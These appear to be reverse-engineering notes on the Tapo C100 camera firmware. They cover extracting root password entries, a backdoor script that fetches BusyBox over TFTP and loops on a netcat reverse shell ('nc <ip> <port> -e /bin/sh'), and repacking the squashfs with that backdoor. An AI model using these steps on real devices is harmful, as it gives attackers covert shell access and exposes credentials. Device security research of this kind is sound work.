# Tapo C100 reverse engineering

## How to obtain passwd and shadow files?

> After extracting the firmware with `binwalk`, search the extracted
> filesystem for password entries by looking for lines that start with
> `root:`.

```console
~ grep -ar "^root:" <path-to-extraction-dir>
```

## Backdoor script

> This shell script waits for network connectivity, downloads a BusyBox
> binary via TFTP, and repeatedly attempts to establish a reverse shell
> connection to a remote host.

### Step-by-step behavior

1. **Waits for internet access**

   > The script continuously pings `google.com` until a response is received,
   > indicating that network connectivity is available.

2. **Downloads payload**

   > Once the network is up, the script changes to the `/tmp` directory and
   > downloads a MIPS little-endian BusyBox binary from a TFTP server.

   ```sh
   tftp -g <ip-address> -r busybox-mipsel
   ```

3. **Makes the binary executable**

   > The downloaded file is marked as executable so it can be run.

   ```sh
   chmod +x busybox-mipsel
   ```

4. **Establishes a reverse shell**

   > The script enters an infinite loop and repeatedly attempts to connect
   > back to a remote host using netcat, spawning a shell on successful
   > connection.

   ```sh
   ./busybox-mipsel nc <ip-address> <port> -e /bin/sh
   ```

## Make squashfs filesystem

> Display filesystem superblock information

```console
~ unsquashfs -s <old-squashfs>
```

> Make squashfs with backdoor.sh script

```console
~ mksquashfs <unsquashed-filesystem> <new-squashfs> -comp <compression> -b <block size>
```
